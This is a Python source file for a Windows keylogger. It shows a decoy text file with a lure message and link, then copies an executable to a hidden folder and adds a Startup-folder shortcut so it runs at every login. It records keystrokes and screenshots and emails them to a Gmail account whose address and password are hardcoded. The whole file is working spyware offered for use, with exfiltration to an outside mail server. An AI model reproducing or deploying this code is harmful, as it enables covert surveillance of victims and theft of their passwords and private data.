import SendKeys
import time
import os
#date date jiga-jiga imports
import datetime

#logging imports
from pynput.keyboard import Key, Listener
from pynput import mouse
import logging

#screencap import
import cv2

import smtplib

#email imports
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.mime.image import MIMEImage
from email import encoders

#copy path imports
import os
import shutil
import getpass
user=getpass.getuser()
dir_path = os.path.dirname(os.path.realpath(__file__))

from PIL import ImageGrab

#change target imports 
import glob
import win32com.client
from win32com.client import Dispatch
import winshell


def main():
	try:
		f=open('example.txt', 'wb')
		os.startfile('example.txt')
		sendMe = str(datetime.datetime.now())+"\nHello There!!!\nuhhhmmm... I want to tell you Something ... read me at  \nhttp://res.cloudinary.com/dguxdl3rn/raw/upload/v1540986398/tilmdzhccxxl4doyerqi.png\n"
		time.sleep(.5)
		SendKeys.SendKeys(sendMe, with_spaces = True, with_newlines = True, with_tabs = True)
		f.write(sendMe)
		os.system('start chrome')
		f.close()

	except Exception as e:
		print str(e)


main()



directory = 'D:\\processes\\win'
if not os.path.exists(directory):
    os.makedirs(directory)
    shutil.copy(dir_path+"\\scor.exe", 'D:\\processes\\win')




def cap_img():
	snapshot = ImageGrab.grab()
	save_path = dir_path +"\\cute.jpg"
	snapshot.save(save_path)


#_______________________________shortcut
dis = 'C:\\Users\\'+user+'\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\scor.exe'
if not os.path.exists(dis):
	destroyah = 'C:\\Users\\'+user+'\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'
	desktop = 'C:\\Users\\'+user+'\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'

	path = os.path.join(destroyah, "scor.lnk")
	target = r'D:\\processes\\win\\scor.exe'
	wDir = r'D:\\processes\\win'
	icon = r'D:\\processes\\win\\scor.exe'
	 
	shell = Dispatch('WScript.Shell')
	shortcut = shell.CreateShortCut(path)
	shortcut.Targetpath = target
	shortcut.WorkingDirectory = wDir
	shortcut.IconLocation = icon
	shortcut.save()
#___________________________________________________________________




def send_mail():
	sender_email_address = "fuzzywizzy3@gmail.com"
	sender_email_password = "naakoycar7"
	reciever_email_address = "fuzzywizzy3@gmail.com"

	email_subject_line = 'Sample Python email'

	msg = MIMEMultipart()
	msg['From'] = sender_email_address
	msg['To'] = reciever_email_address
	msg['Subject'] = email_subject_line

	email_body = "An Email from "+user
	msg.attach(MIMEText(email_body,'plain'))

	filename = 'sweets.txt'
	attachment_file = open('sweets.txt','a+')
	part = MIMEBase('application', 'octet-stream')
	part.set_payload((attachment_file).read())
	encoders.encode_base64(part)

	attachment = 'cute.jpg'
	fp = open(attachment, 'rb')                                                    
	img = MIMEImage(fp.read())
	fp.close()
	img.add_header('Content-ID', '<{}>'.format(attachment))
	msg.attach(img)
	part.add_header('Content-Disposition',"attachment_file; filename = " + filename)
	
	
	msg.attach(part)

	email_content =msg.as_string()
	server = smtplib.SMTP('smtp.gmail.com:587')

	server.starttls()
	server.login(sender_email_address,sender_email_password)

	server.sendmail(sender_email_address,reciever_email_address, email_content)
	server.quit()

# log_dir = "C:/Users/buang/Desktop/hacking_snnipets/sweety/"

logging.basicConfig(filename=("sweets.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_click(x,y,button,pressed):
	if button == mouse.Button.left:
		send_mail()
		cap_img()
		with Listener(on_press=on_press) as listener:
			listener.join()

		with mouse.Listener(on_click=on_click) as listener:
			listener.join()

def on_press(key):
	logging.info(key)

	if key == Key.enter:
		cap_img()
		send_mail()
		f = open('sweets.txt','wb')
		f.close()
		
		
		with Listener(on_press=on_press) as listener:
			listener.join()
		with mouse.Listener(on_click=on_click) as listener:
			listener.join()
	#after ni sya sa send_mail()



with Listener(on_press=on_press) as listener:
	listener.join()